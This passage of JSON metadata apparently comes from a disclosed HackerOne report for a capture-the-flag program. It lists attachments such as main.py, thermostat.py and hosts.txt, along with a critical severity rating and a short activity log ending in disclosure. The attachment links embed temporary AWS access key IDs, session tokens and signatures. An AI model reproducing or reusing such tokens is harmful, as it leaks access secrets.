A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=2cd5efeb02a56cd0c6e58fd7757c00ec3585efd485b3110d5efb9aa8b3d92423","file_size":47031,"type":"image/png"},{"id":440491,"file_name":"accounting.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/491/663bd5f0074c02f5bffdd3b6ddb439d3df3aef28/accounting.png?response-content-disposition=attachment%3B%20filename%3D%22accounting.png%22%3B%20filename%2A%3DUTF-8%27%27accounting.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=dab04fca195f4caef46a49eea871dc19263d1909745bdb6cdc758ec4098f71a6","file_size":4359,"type":"image/png"},{"id":440492,"file_name":"stego1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/492/c2f872dc92618e4fc459f46a62ecfdcfe19cdaca/stego1.png?response-content-disposition=attachment%3B%20filename%3D%22stego1.png%22%3B%20filename%2A%3DUTF-8%27%27stego1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=5b70944f801e3c493ac5b31131dce7cb527672604580c1f5f1a855f3684214af","file_size":1088703,"type":"image/png"},{"id":440493,"file_name":"accounting2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/493/fce7956546bdb404adebdb9117ba1f055f1f5ce4/accounting2.png?response-content-disposition=attachment%3B%20filename%3D%22accounting2.png%22%3B%20filename%2A%3DUTF-8%27%27accounting2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=b1aa3a93ef2b03259eaba397d91042a10f2dafa908bdd4ef89773ff2cbdffa84","file_size":13420,"type":"image/png"},{"id":440494,"file_name":"flite0.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/494/fa311e81b8ed59aa29b8395a57deb5bf8a4bc762/flite0.png?response-content-disposition=attachment%3B%20filename%3D%22flite0.png%22%3B%20filename%2A%3DUTF-8%27%27flite0.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=be815336bcd38b9e79b6a12a317e38e3d146487d1d5f7df079e7a7e868f9464a","file_size":4589,"type":"image/png"},{"id":440498,"file_name":"main.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/498/351c8b3a1e6009427e3a25f603383d2dc7b53f22/main.py?response-content-disposition=attachment%3B%20filename%3D%22main.py%22%3B%20filename%2A%3DUTF-8%27%27main.py\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=7a83939e41df480d247e8256eba3e43e6a937f8a61f5adb5f62e3ab4d3ccb160","file_size":3390,"type":"text/plain"},{"id":440500,"file_name":"thermostat.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/500/b7872a49e33d9944a8c7d2f76ed851834728e9a9/thermostat.py?response-content-disposition=attachment%3B%20filename%3D%22thermostat.py%22%3B%20filename%2A%3DUTF-8%27%27thermostat.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=2acc90a4e3bc335d1a28fccb3015a19c2201ca6e10fb45fbab7e34881b38df5e","file_size":2784,"type":"text/x-python"},{"id":440501,"file_name":"hosts.txt","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/501/abd1276a72e20598c3fd0a3349f3458188d1fe30/hosts.txt?response-content-disposition=attachment%3B%20filename%3D%22hosts.txt%22%3B%20filename%2A%3DUTF-8%27%27hosts.txt\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=d68e72533f5a92ee7f78dfdeea86b9f8fd0480529f13ae11d9b47e530d890d3c","file_size":2267,"type":"text/plain"}],"allow_singular_disclosure_at":"2019-05-08T15:56:14.636Z","allow_singular_disclosure_after":-51891366.19883925,"singular_disclosure_allowed":true,"vote_count":19,"voters":["checkm50","mashoud1122","stealthy","amad3u6","mygf","weedman3000","01alsanosi","a_p","akshay__brijpuria","0619","and 9 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4313307,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-13T06:03:51.014Z","updated_at":"2019-03-13T06:03:51.014Z","additional_data":{"old_severity":null,"new_severity":"Critical","old_severity_id":null,"new_severity_id":315501},"actor":{"username":"stong","cleared":false,"url":"/stong","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/308/492/483bbf842beb55bc2377d05e2085b606b3266dd4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4492843,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","markdown_message":"\u003cp\u003eThank you for the amazing report! We\u0026#39;ll be announcing the winners shortly, so we\u0026#39;ll let you know if you\u0026#39;re one of the reports selected. Going to close this and then request public disclosure now.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T18:33:46.526Z","updated_at":"2019-04-05T18:33:46.526Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"stong","url":"/stong"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509097,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:56:14.586Z","updated_at":"2019-04-08T15:56:14.586Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509098,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:56:21.862Z","updated_at":"2019-04-08T15:56:21.862Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}